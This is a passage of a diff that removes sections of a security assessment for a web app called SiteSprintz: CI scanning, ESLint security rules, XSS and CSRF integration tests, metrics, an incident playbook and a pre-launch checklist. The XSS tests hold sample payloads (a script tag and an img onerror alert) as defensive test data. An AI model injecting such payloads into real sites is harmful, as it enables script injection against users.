-        uses: actions/setup-node@v3
-        with:
-          node-version: '20'
-      
-      - name: Install dependencies
-        run: npm ci
-      
-      - name: Run npm audit
-        run: npm audit --audit-level=high
-      
-      - name: Run Snyk Security Scan
-        uses: snyk/actions/node@master
-        env:
-          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
-        with:
-          args: --severity-threshold=high
-```
-
-#### B. Static Analysis
-
-```bash
-# Install ESLint security plugin
-npm install --save-dev eslint-plugin-security
-
-# .eslintrc.js
-{
-  "plugins": ["security"],
-  "extends": ["plugin:security/recommended"],
-  "rules": {
-    "security/detect-object-injection": "error",
-    "security/detect-non-literal-regexp": "warn",
-    "security/detect-unsafe-regex": "error",
-    "security/detect-buffer-noassert": "error",
-    "security/detect-eval-with-expression": "error",
-    "security/detect-no-csrf-before-method-override": "error",
-    "security/detect-possible-timing-attacks": "warn"
-  }
-}
-```
-
-#### C. Integration Tests
-
-```javascript
-// tests/security/xss-prevention.test.js
-describe('XSS Prevention', () => {
-  it('should strip script tags from site content', async () => {
-    const maliciousContent = {
-      sections: [{
-        type: 'html',
-        content: '<div>Hello</div><script>alert("XSS")</script>'
-      }]
-    };
-    
-    const response = await request(app)
-      .post('/api/sites')
-      .set('Authorization', `Bearer ${userToken}`)
-      .send({ siteData: maliciousContent })
-      .expect(201);
-    
-    const site = await prisma.site.findUnique({
-      where: { id: response.body.id }
-    });
-    
-    expect(site.data.sections[0].content).not.toContain('<script>');
-    expect(site.data.sections[0].content).toContain('Hello');
-  });
-  
-  it('should remove event handlers', async () => {
-    const maliciousContent = {
-      sections: [{
-        content: '<img src=x onerror="alert(1)">'
-      }]
-    };
-    
-    const response = await request(app)
-      .post('/api/sites')
-      .set('Authorization', `Bearer ${userToken}`)
-      .send({ siteData: maliciousContent })
-      .expect(201);
-    
-    const site = await prisma.site.findUnique({
-      where: { id: response.body.id }
-    });
-    
-    expect(site.data.sections[0].content).not.toContain('onerror');
-  });
-});
-
-// tests/security/csrf-protection.test.js
-describe('CSRF Protection', () => {
-  it('should reject POST without CSRF token', async () => {
-    await request(app)
-      .post('/api/sites')
-      .set('Authorization', `Bearer ${userToken}`)
-      .send({ subdomain: 'test' })
-      .expect(403);
-  });
-  
-  it('should accept POST with valid CSRF token', async () => {
-    // Get CSRF token
-    const tokenRes = await request(app)
-      .get('/api/csrf-token')
-      .expect(200);
-    
-    const csrfToken = tokenRes.body.csrfToken;
-    
-    // Use token in request
-    await request(app)
-      .post('/api/sites')
-      .set('Authorization', `Bearer ${userToken}`)
-      .set('X-CSRF-Token', csrfToken)
-      .set('Cookie', tokenRes.headers['set-cookie'])
-      .send({ subdomain: 'test', templateId: 'restaurant' })
-      .expect(201);
-  });
-});
-```
-
----
-
-## 6. 📊 SECURITY METRICS & KPIs
-
-### Key Performance Indicators
-
-| Metric | Target | Current | Status |
-|--------|--------|---------|--------|
-| **Dependency Vulnerabilities** | 0 high/critical | ? | 🔴 Unknown |
-| **CSRF Protection Coverage** | 100% of state-changing endpoints | ~70% (auth bypassed) | 🟠 Partial |
-| **XSS Prevention** | 100% of user content sanitized | 0% (no sanitization) | 🔴 Critical |
-| **Rate Limiting** | All endpoints | Partial | 🟠 Partial |
-| **Failed Login Attempts** | < 1% daily | ? | 🔴 Unknown |
-| **Unauthorized Access Attempts** | Logged + alerted | Not tracked | 🔴 Unknown |
-| **Security Audit** | Quarterly | Never | 🔴 Required |
-| **Penetration Test** | Annually | Never | 🔴 Required |
-| **Incident Response Time** | < 1 hour | No plan | 🔴 Required |
-
-### Monitoring Dashboard
-
-```javascript
-// server/routes/admin/security-dashboard.js
-import { requireAdmin } from '../../middleware/auth.js';
-
-router.get('/admin/security/dashboard', requireAdmin, async (req, res) => {
-  // Aggregate security metrics from logs
-  const last24h = new Date(Date.now() - 24 * 60 * 60 * 1000);
-  
-  const metrics = {
-    authentication: {
-      loginAttempts: await getLoginAttempts(last24h),
-      failedLogins: await getFailedLogins(last24h),
-      successRate: '...'
-    },
-    authorization: {
-      unauthorizedAttempts: await getUnauthorizedAttempts(last24h),
-      permissionDenied: '...'
-    },
-    rateLimiting: {
-      requestsBlocked: await getRateLimitExceeded(last24h),
-      topOffenders: '...'
-    },
-    inputValidation: {
-      xssAttempts: await getXSSAttempts(last24h),
-      sqlInjectionAttempts: '...'
-    },
-    uploads: {
-      totalUploads: '...',
-      rejectedUploads: '...',
-      rejectionReasons: '...'
-    },
-    webhooks: {
-      invalidSignatures: '...',
-      replayAttempts: '...'
-    }
-  };
-  
-  res.json(metrics);
-});
-```
-
----
-
-## 7. 🚨 INCIDENT RESPONSE
-
-### Incident Classification
-
-| Level | Description | Example | Response Time |
-|-------|-------------|---------|---------------|
-| **P0 - Critical** | Active exploitation, data breach | XSS being exploited in production | < 15 minutes |
-| **P1 - High** | Vulnerability discovered, not yet exploited | Unpatched critical CVE | < 2 hours |
-| **P2 - Medium** | Security misconfiguration | Weak rate limits | < 24 hours |
-| **P3 - Low** | Minor issue, low risk | Information disclosure | < 1 week |
-
-### Response Playbook
-
-#### Phase 1: Detection
-
-```
-1. Alert triggered (automated or manual report)
-2. Verify incident is legitimate (not false positive)
-3. Classify severity (P0-P3)
-4. Notify incident response team
-```
-
-#### Phase 2: Containment
-
-```
-P0/P1 Incidents:
-1. Isolate affected systems
-2. Block attacking IPs (if identified)
-3. Revoke compromised tokens/sessions
-4. Enable "maintenance mode" if needed
-5. Take database snapshot
-
-P2/P3 Incidents:
-1. Document issue
-2. Plan fix timeline
-```
-
-#### Phase 3: Eradication
-
-```
-1. Identify root cause
-2. Apply security patch
-3. Update dependencies if vulnerable
-4. Test fix in staging environment
-5. Deploy to production
-```
-
-#### Phase 4: Recovery
-
-```
-1. Restore normal operations
-2. Monitor for recurrence
-3. Verify attack has stopped
-4. Lift maintenance mode
-```
-
-#### Phase 5: Post-Mortem
-
-```
-1. Document timeline of events
-2. Identify how attack succeeded
-3. Document what worked/failed in response
-4. Update security controls to prevent recurrence
-5. Share lessons learned with team
-```
-
----
-
-## 8. 📚 RESOURCES
-
-### Security Tools
-
-- **OWASP ZAP**: Web application security scanner
-- **Burp Suite**: Penetration testing toolkit
-- **Snyk**: Dependency vulnerability scanner
-- **npm audit**: Built-in Node.js security auditor
-- **ESLint Security Plugin**: Static analysis for security issues
-
-### Training & References
-
-- **OWASP Top 10**: https://owasp.org/www-project-top-ten
-- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org
-- **Web Application Security** (Andrew Hoffman)
-- **Release It!** (Michael Nygard) - Stability patterns
-- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
-
-### Compliance
-
-- **GDPR**: https://gdpr.eu
-- **CCPA**: https://oag.ca.gov/privacy/ccpa
-- **PCI DSS**: https://www.pcisecuritystandards.org (if processing cards directly)
-
----
-
-## 9. ✅ PRE-LAUNCH SECURITY CHECKLIST
-
-### CRITICAL - Must Complete Before Launch
-
-- [ ] **CSRF protection enabled** on ALL state-changing endpoints (no bypasses)
-- [ ] **XSS prevention** - all user content sanitized
-- [ ] **JWT tokens stored in httpOnly cookies** (not localStorage)
-- [ ] **Security headers configured** (Helmet with CSP)
-- [ ] **Rate limiting** on auth, API, and upload endpoints
-- [ ] **HTTPS enforced** in production (HSTS enabled)
-- [ ] **Environment secrets validated** at startup (no weak defaults)
-- [ ] **Dependency vulnerabilities** scanned and patched (npm audit)
-- [ ] **Ownership verification** on site/resource access (IDOR prevention)
-- [ ] **File upload validation** - magic bytes + size limits
-- [ ] **Error messages sanitized** - no stack traces or sensitive info
-- [ ] **Database queries parameterized** (Prisma ✅, but verify no raw SQL)
-- [ ] **Session management secure** - regenerate on login, expire on logout
-- [ ] **Webhook signature verification** enabled (Stripe)
-- [ ] **Security logging** implemented (failed logins, unauthorized access)
-- [ ] **Incident response plan** documented
-- [ ] **Backup and recovery** tested
-- [ ] **Penetration test** completed (or scheduled)
-
-### HIGH PRIORITY - Complete Within 30 Days
-
-- [ ] **Token revocation/blacklist** implemented
-- [ ] **Security monitoring dashboard** operational
-- [ ] **Automated security scans** in CI/CD pipeline
-- [ ] **Security audit** scheduled quarterly
-- [ ] **GDPR compliance** - data export/delete
-- [ ] **Security documentation** updated
-- [ ] **Bug bounty program** considered
-
----
-
-## 10. 🎓 KEY TAKEAWAYS
-
-### For SiteSprintz Specifically
-
-1. **Visual Editor is the #1 Attack Surface**: User-generated HTML must be sanitized
-2. **Multi-Tenant Architecture = IDOR Risk**: Always verify ownership before allowing access
-3. **JWT in localStorage = XSS Risk**: Move to httpOnly cookies immediately
-4. **CSRF Bypass = Production Blocker**: Cannot launch with auth endpoints bypassed
-5. **File Uploads Need Content Validation**: MIME type alone is insufficient
-
-### General Security Principles
-
-1. **Defense in Depth**: Multiple layers of protection (sanitization + CSP + escaping)
-2. **Fail Securely**: Errors should default to denying access, not granting it
-3. **Least Privilege**: Users/services should have minimum permissions needed
-4. **Assume Breach**: Plan for compromise, not just prevention
-5. **Security is Ongoing**: Not a one-time task - continuous monitoring required
-
-### From "Web Application Security" Book
-
-1. **Recon Matters**: Assume attackers will find all endpoints, technologies, dependencies
-2. **Offense Informs Defense**: Understand attacker mindset to build better defenses
-3. **No Security Through Obscurity**: Hiding tech stack doesn't prevent attacks
-4. **Test Everything**: Automated security testing catches regressions
-
----
-
-## NEXT STEPS
-
-1. **Review this assessment** with engineering team
-2. **Prioritize Phase 1 tasks** (production blockers)
-3. **Create implementation tickets** with estimates
-4. **Schedule security testing** after Phase 1 completion
-5. **Establish security review process** for new features
-
-**Estimated Time to Production-Ready Security**: 2-3 weeks (80-85 hours)
-
----
-
-*This assessment is based on the current codebase as of November 17, 2025. Regular updates required as application evolves.*
+*Assessment based on the working tree as of August 15, 2026. Re-review when the P1 items are closed.*
 
